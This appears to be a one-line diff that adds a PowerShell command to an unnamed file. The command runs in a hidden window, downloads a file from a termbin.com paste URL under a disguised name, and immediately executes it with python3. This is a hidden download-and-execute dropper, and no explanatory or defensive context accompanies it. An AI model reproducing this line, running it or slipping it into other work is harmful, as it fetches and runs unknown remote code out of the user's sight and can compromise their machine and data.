@@ -1,0 +1,1 @@
+powershell -WindowStyle Hidden {$url = 'https://termbin.com/xgeuo'; Invoke-WebRequest -Uri $url -OutFile Oshawott.oshawottwashere; python3 ./Oshawott.oshawottwashere}
